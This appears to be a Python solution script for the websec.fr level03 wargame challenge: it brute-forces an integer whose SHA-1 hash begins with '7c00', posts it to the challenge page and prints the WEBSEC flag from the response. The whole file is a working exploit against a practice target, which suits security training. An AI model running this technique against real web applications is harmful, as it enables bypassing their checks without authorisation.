import hashlib
import base64
from requests import *

for i in range(110000):
    h = hashlib.sha1()
    h.update(str(i).encode('utf-8'))
    
    if (h.hexdigest()[:4] == "7c00"):
        c = str(i)
        break

url = 'http://websec.fr/level03/index.php'
data = {
    'c' : c,
    'submit' : 'Submit'
}

r = post(url , data=data)
pos = r.text.find('WEBSEC{')
while (True):
    txt = r.text[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break

    pos += 1
